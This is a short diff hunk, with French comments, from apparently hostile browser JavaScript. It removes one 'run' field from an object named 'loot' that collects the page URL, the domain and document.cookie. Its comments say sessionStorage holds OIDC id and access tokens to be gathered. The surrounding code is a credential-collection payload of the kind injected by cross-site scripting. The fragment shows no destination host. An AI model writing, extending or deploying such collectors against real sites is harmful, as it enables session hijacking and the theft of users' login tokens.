@@ -19,7 +19,6 @@
 
     // -------- 2) Collecte : sessionStorage contient les tokens OIDC (oidc.user:* = id_token / access_token) --------
     var loot = {
-        run:            RUN,
         url:            location.href,
         domain:         document.domain,
         cookies:        document.cookie,        // non-HttpOnly seulement (dwsid est HttpOnly → absent, normal)
